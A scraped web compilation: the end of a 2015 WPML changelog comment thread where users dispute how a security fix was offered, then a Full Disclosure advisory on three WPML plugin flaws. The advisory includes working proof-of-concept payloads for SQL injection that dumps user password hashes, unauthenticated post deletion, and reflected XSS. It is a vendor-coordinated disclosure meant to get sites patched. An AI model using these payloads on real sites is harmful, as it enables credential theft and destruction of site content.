
      + ![](data:image/svg+xml...)![](https://secure.gravatar.com/avatar/b8e8796f67ed40fd8d46694dd58fea1d?s=60&d=mm&r=g) **Jose Luis** says:
        [March 23, 2015 at 11:48 am](https://wpml.org/changelog/2015/03/wpml-security-update-bug-and-fix/#comment-1355542)

        I understand what you’ve done, I simply don’t agree and find it unfair. This is not “a change I didn’t ask for”, is a serious vulnerability due to bad coding that you should take responsibility for as you do with our payments. There should be a patch or at least clear procedures on how to stop/fix it for any previous installation, who is affected, etc.

        After a few hundred sites hacked because of your plugin, you’re reputation will drastically change, I bet.
19. ![](data:image/svg+xml...)![](https://secure.gravatar.com/avatar/5911ef9b2a3ae25444f289dc6c8f7e82?s=60&d=mm&r=g) **Philippe** says:
    [March 24, 2015 at 5:10 pm](https://wpml.org/changelog/2015/03/wpml-security-update-bug-and-fix/#comment-1356849)

    Hi,

    It is still not fixed for me.

    It is still impossible to do the update.

    Any new update coming?

    Thank you,

    Philippe

    * ![](data:image/svg+xml...)![](https://secure.gravatar.com/avatar/de5a890275317d925494c33fd97a722e?s=60&d=mm&r=g) **Agnes Bury** says:
      [March 25, 2015 at 8:10 am](https://wpml.org/changelog/2015/03/wpml-security-update-bug-and-fix/#comment-1357110)

      Hi Philippe, have you upgraded to the latest versions and your problem persists? If so, could you please report it in our support forum.

      + ![](data:image/svg+xml...)![](https://secure.gravatar.com/avatar/5911ef9b2a3ae25444f289dc6c8f7e82?s=60&d=mm&r=g) **Philippe** says:
        [March 29, 2015 at 8:06 am](https://wpml.org/changelog/2015/03/wpml-security-update-bug-and-fix/#comment-1362778)

        Hi Agnes,

        The problem is that I can upgrade to the last version. The upgrade does not work.

        I will report in the support forum.

        Thank you,

        Philippe

        - ![](data:image/svg+xml...)![](https://secure.gravatar.com/avatar/de5a890275317d925494c33fd97a722e?s=60&d=mm&r=g) **Agnes Bury** says:
          [March 30, 2015 at 7:05 am](https://wpml.org/changelog/2015/03/wpml-security-update-bug-and-fix/#comment-1363044)

          Thanks Philippe. Which WPML version have you been upgrading from?
21. ![](data:image/svg+xml...)![](https://secure.gravatar.com/avatar/1eb72dbdda36bdf84c97e2c98d6019bf?s=60&d=mm&r=g) **Arnau Vazquez** says:
    [April 6, 2015 at 4:55 pm](https://wpml.org/changelog/2015/03/wpml-security-update-bug-and-fix/#comment-1366041)

    I was also pissed off when I heard you were only providing the security fix to existing customers, and others like me who had paid for several years would not. But just when I was going to delve into the code to patch the exploit myself I saw that you had released an upgrade for all previous customers. It is fair then to applaud your change of mind and support to existing but discontinued installations.

    Kudos to the team and please keep working on such an essential plugin.

    * ![](data:image/svg+xml...)![](https://secure.gravatar.com/avatar/c12fddc409680bec9036c4f57287ce79?s=60&d=mm&r=g) **Amir** says:
      [April 6, 2015 at 5:55 pm](https://wpml.org/changelog/2015/03/wpml-security-update-bug-and-fix/#comment-1366056)

      Thanks for the feedback. I’m glad to see that you’re taking the security updates and applying them to your sites. I hope that everyone does that.
23. ![](data:image/svg+xml...)![](https://secure.gravatar.com/avatar/15075cc5a37d542d50ed19730f450349?s=60&d=mm&r=g) **Davide** says:
    [May 2, 2015 at 10:30 pm](https://wpml.org/changelog/2015/03/wpml-security-update-bug-and-fix/#comment-1376776)

    I don’t quite understand how this works. I did your security update, (my subscription is expired) but still plugin system is asking for more updates, to the 3.1.9.6.

    because of this, wordfence is not happy, and read this as a security issue.

    In the backend of wordpress I have 2 required update, and the plugin have some manacing looking read writing, saying that i need get a subscription in order to update.

    this looks a bit forceful, and in my opinion it shouldn’t look like this.

    I should not have some red writing in the backend of my wordpress, after I’ve done aa security update, and your pluging should not ask for a subscription in that way, leaving my backend with 2 required update to your plugin.

    You’ve done a security update, thank you for that, however, it looks more like a manouvre to force people into pay again a subscription rather then a securoty update. that’s the way it looks to me, at least.

    it’s not a clean job.

    you could have offered the update as you did, without leaving this “read marks” in people backend. the security update should have been a complete script, not asking for more update to those who choose (for whatever reason) not to pay extra money to re-buy the software. Your subscription should have geared toward extra functionality, rather than a re-buy solution.

    I din’t like the way it has been put the whole thing.

    * ![](data:image/svg+xml...)![](https://secure.gravatar.com/avatar/c12fddc409680bec9036c4f57287ce79?s=60&d=mm&r=g) **Amir** says:
      [May 3, 2015 at 8:07 am](https://wpml.org/changelog/2015/03/wpml-security-update-bug-and-fix/#comment-1376822)

      Clients with valid accounts get access to all of WPML updates and to our support.

      We released a free security-only update for WPML a few weeks back. This update addressed several security updates which could have opened your site to exploits. Paying client or not, we don’t want anyone’s site to be hacked due to older WPML versions.

      We keep developing WPML and producing new updates. Normally, our updates are not strictly meant to solve security problems. We provide updates with new features, bug fixes, compatibility with new WordPress versions and new features. These updates are only available to clients with valid accounts. WordPress shows you these updates, because they exist.

      If you don’t want to get new WPML versions, you can ignore these updates.

      If you upgraded from a very old WPML version, you only now see the new-version notices. This was included in WPML around two years ago. We thought that it’s better to notify about new versions directory to the WordPress admin, like most plugins do. Most people enjoy these notices, so they know when new versions are available.

      Of course, if you feel like our security upgrade isn’t a good idea for your site, you can always go back to the older versions.

© 2025 [OnTheGoSystems Limited (opens in a new window)](https://www.onthegosystems.com)

![en](https://cdn.wpml.org/wp-content/plugins/sitepress-multilingual-cms/res/flags/en.svg) English

* [![en](https://cdn.wpml.org/wp-content/plugins/sitepress-multilingual-cms/res/flags/en.svg) English](https://wpml.org/changelog/2015/03/wpml-security-update-bug-and-fix/)
* [![es](data:image/svg+xml...)![es](https://cdn.wpml.org/wp-content/plugins/sitepress-multilingual-cms/res/flags/es.svg) Español](https://wpml.org/es/versiones-wpml-es/2015/03/wpml-security-update-bug-and-fix/)
* [![de](data:image/svg+xml...)![de](https://cdn.wpml.org/wp-content/plugins/sitepress-multilingual-cms/res/flags/de.svg) Deutsch](https://wpml.org/de/wpml-versionen-de/2015/03/wpml-security-update-bug-and-fix/)
* [![fr](data:image/svg+xml...)![fr](https://cdn.wpml.org/wp-content/plugins/sitepress-multilingual-cms/res/flags/fr.svg) Français](https://wpml.org/fr/version-de-wpml-fr/2015/03/wpml-security-update-bug-and-fix/)
* [![pt-br](data:image/svg+xml...)![pt-br](https://cdn.wpml.org/wp-content/plugins/sitepress-multilingual-cms/res/flags/pt-br.svg) Português](https://wpml.org/pt-br/versoes-do-wpml-pt-br/2015/03/wpml-security-update-bug-and-fix/)
* [![ru](data:image/svg+xml...)![ru](https://cdn.wpml.org/wp-content/plugins/sitepress-multilingual-cms/res/flags/ru.svg) Русский](https://wpml.org/ru/%D0%B2%D0%B5%D1%80%D1%81%D0%B8%D0%B8-wpml-ru/2015/03/wpml-security-update-bug-and-fix/)
* [![it](data:image/svg+xml...)![it](https://cdn.wpml.org/wp-content/plugins/sitepress-multilingual-cms/res/flags/it.svg) Italiano](https://wpml.org/it/versioni-di-wpml-it/2015/03/wpml-security-update-bug-and-fix/)

* [![ja](data:image/svg+xml...)![ja](https://cdn.wpml.org/wp-content/plugins/sitepress-multilingual-cms/res/flags/ja.svg) 日本語](https://wpml.org/ja/wpml-%E3%83%90%E3%83%BC%E3%82%B8%E3%83%A7%E3%83%B3-ja/2015/03/wpml-security-update-bug-and-fix/)
* [![zh-hans](data:image/svg+xml...)![zh-hans](https://cdn.wpml.org/wp-content/plugins/sitepress-multilingual-cms/res/flags/zh-hans.svg) 简体中文](https://wpml.org/zh-hans/wpml%E7%89%88%E6%9C%AC/2015/03/wpml-security-update-bug-and-fix/)
* [![ko](data:image/svg+xml...)![ko](https://cdn.wpml.org/wp-content/plugins/sitepress-multilingual-cms/res/flags/ko.svg) 한국어](https://wpml.org/ko/wpml-%EB%B2%84%EC%A0%84/2015/03/wpml-security-update-bug-and-fix/)
* [![th](data:image/svg+xml...)![th](https://cdn.wpml.org/wp-content/plugins/sitepress-multilingual-cms/res/flags/th.svg) ไทย](https://wpml.org/th/%E0%B9%80%E0%B8%A7%E0%B8%AD%E0%B8%A3%E0%B9%8C%E0%B8%8A%E0%B8%B1%E0%B8%99-wpml/2015/03/wpml-security-update-bug-and-fix/)
* [![vi](data:image/svg+xml...)![vi](https://cdn.wpml.org/wp-content/plugins/sitepress-multilingual-cms/res/flags/vi.svg) Vietnamese](https://wpml.org/vi/phien-ban-wpml/2015/03/wpml-security-update-bug-and-fix/)

* [![he](data:image/svg+xml...)![he](https://cdn.wpml.org/wp-content/plugins/sitepress-multilingual-cms/res/flags/he.svg) עברית](https://wpml.org/he/%D7%92%D7%A8%D7%A1%D7%90%D7%95%D7%AA-wpml-he/2015/03/wpml-security-update-bug-and-fix/)
* [![ar](data:image/svg+xml...)![ar](https://cdn.wpml.org/wp-content/plugins/sitepress-multilingual-cms/res/flags/ar.svg) العربية](https://wpml.org/ar/%D8%A5%D8%B5%D8%AF%D8%A7%D8%B1%D8%A7%D8%AA-wpml-ar/2015/03/wpml-security-update-bug-and-fix/)

[(opens in a new window)](https://www.onthegosystems.com)

[About WPML](https://wpml.org/home/about-us/)

[GDPR & Privacy Policy](https://wpml.org/documentation/privacy-policy-and-gdpr-compliance/)

[Join Our Team (opens in a new window)](https://www.onthegosystems.com/jobs/)

[(opens in a new window)](http://twitter.com/wpml)
[(opens in a new window)](https://www.facebook.com/WPMLcms/)
[(opens in a new window)](https://www.youtube.com/channel/UC0-st_ubApkPzzgxuBh2T0A)

Manage Cookie Consent

* We use cookies to optimize our website and services. Your consent allows us to process data such as browsing behavior. Not consenting may affect some features.

Functional

Functional

Always active

Required for our website to operate and communicate correctly.

Preferences

Preferences

The technical storage or access is necessary for the legitimate purpose of storing preferences that are not requested by the subscriber or user.

Statistics

Statistics

We use these to analyze the statistics of our site. Collected information is completely anonymous.
The technical storage or access that is used exclusively for anonymous statistical purposes. Without a subpoena, voluntary compliance on the part of your Internet Service Provider, or additional records from a third party, information stored or retrieved for this purpose alone cannot usually be used to identify you.

Marketing

Marketing

These cookies track your browsing to provide ads relevant to you.

Manage options
Manage services
Manage {vendor\_count} vendors
[Read more about these purposes](https://cookiedatabase.org/tcf/purposes/)

Accept
Deny
View preferences
Save preferences
View preferences

{title}
{title}
{title}

Manage Cookie Consent



=== Content from packetstormsecurity.com_3d08b664_20250125_021702.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

 [About](/help/view/4) |
[Terms](/tos/) |
[Copyright](/help/view/7) |
[Privacy](/help/view/6) |
[BlueSky](https://bsky.app/profile/packetstorm.bsky.social) |
[X](https://x.com/packet_storm) |
[Mastodon](https://infosec.exchange/%40packet_storm/)



=== Content from seclists.org_78b0c847_20250125_021703.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)
## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](70)
[By Date](date.html#71)
[![Next](/images/right-icon-16x16.png)](72)

[![Previous](/images/left-icon-16x16.png)](74)
[By Thread](index.html#71)
[![Next](/images/right-icon-16x16.png)](79)

![](/shared/images/nst-icons.svg#search)

# WPML WordPress plug-in SQL injection etc.

---

*From*: Jouko Pynnonen <jouko () iki fi>

*Date*: Thu, 12 Mar 2015 20:38:31 +0200

---

```
*OVERVIEW*

WPML is the industry standard for creating multi-lingual WordPress sites.
Three vulnerabilities were found in the plug-in. The most serious of them,
an SQL injection problem, allows anyone to read the contents of the
WordPress database, including user details and password hashes, without
authentication.

System administrators should update to version 3.1.9.1 released earlier
this week to resolve the issues.

*DETAILS*

*1. SQL injection*
When WPML processed a HTTP POST request containing the parameter
”action=wp-link-ajax”, the current language is determined by parsing the
HTTP referer. The parsed language code is not checked for validity, nor
SQL-escaped. The user doesn’t need to be logged in.

By sending a carefully crafted referer value with the mentioned POST
request parameter, an attacker can perform SQL queries on arbitrary tables
and retrieve their results. In addition to the standard WordPress database
and tables, the attacker may query all other databases and tables
accessible to the web backend.

The following HTML snippet demonstrates the vulnerability:

<script>var union="select
user_login,1,user_email,2,3,4,5,6,user_pass,7,8,9,10,11,12 from
wp_users";if (document.location.search.length < 2)
        document.location.search="lang=xx' UNION "+union+" -- -- ";</script>
<form method=POST
action="[https://YOUR.WORDPRESS.BLOG/comments/feed"](https://YOUR.WORDPRESS.BLOG/comments/feed%22);><input type=hidden
name=action value="wp-link-ajax"><input type=submit></form>

The results of the SQL query will be shown in the comments feed
XML-formatted.

*2. Page/post/menu deletion*

WPML contains a ”menu sync” function which helps site administrators to
keep WordPress menus consistent across different languages. This
functionality lacked any access control, allowing anyone to delete
practically all content of the website - posts, pages, and menus.
Example:

<form method=POST
action="<https://YOUR.WORDPRESS.BLOG/?page=sitepress-multilingual-cms/menu/menus-sync.php">;><input
type=hidden name="action" value="icl_msync_confirm"><input type=text
name="sync" size=50 value="del[x][y][12345]=z"><input
type=submit></form>

Submitting the above form would delete the row with the ID 12345 in the
wp_posts database. Several items be deleted with the same request.

*3. Reflected XSS*

The ”reminder popup” code intended for administrators in WPML didn’t check
for login status or nonce. An attacker can direct target users to an URL
like:

<https://YOUR.WORDPRESS.BLOG/?icl_action=reminder_popup&target=javascript%3Aalert%28%2Fhello+world%2f%29%3b%2f%2f>

to execute JavaScript in their browser. This example bypasses the Chrome
XSS Auditor.
In the case of WordPress, XSS triggered by an administrator can lead to
server-side compromise via the plugin and theme editors.

*CREDITS*

The vulnerabilities were found by Jouko Pynnonen of Klikki Oy while
researching WordPress plugins falling in the scope of the Facebook bug
bounty program.

The vendor was notified on March 02, 2015 and the patch was released on
March 10.

Vendor advisory: <http://wpml.org/2015/03/wpml-security-update-bug-and-fix/>

An up-to-date version of this document can be found on our website
<http://klikki.fi> .

--
Jouko Pynnönen <jouko () iki fi>
Klikki Oy - <http://klikki.fi>

_______________________________________________
Sent through the Full Disclosure mailing list
<https://nmap.org/mailman/listinfo/fulldisclosure>
Web Archives & RSS: <http://seclists.org/fulldisclosure/>
```

---

[![Previous](/images/left-icon-16x16.png)](70)
[By Date](date.html#71)
[![Next](/images/right-icon-16x16.png)](72)

[![Previous](/images/left-icon-16x16.png)](74)
[By Thread](index.html#71)
[![Next](/images/right-icon-16x16.png)](79)

### Current thread:

* **WPML WordPress plug-in SQL injection etc.** *Jouko Pynnonen (Mar 12)*
  + <Possible follow-ups>
  + [Re: WPML WordPress plug-in SQL injection etc.](79) *Jouko Pynnonen (Mar 16)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")


